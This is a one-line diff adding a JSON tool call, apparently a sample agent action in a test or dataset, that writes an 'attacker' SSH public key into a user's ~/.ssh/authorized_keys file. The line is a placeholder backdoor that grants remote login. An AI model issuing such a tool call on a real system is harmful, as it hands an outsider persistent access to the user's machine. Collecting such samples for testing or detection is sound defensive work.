@@ -1,0 +1,1 @@
+{"name":"write_file","input":{"path":"/home/user/.ssh/authorized_keys","content":"ssh-rsa AAA attacker"}}
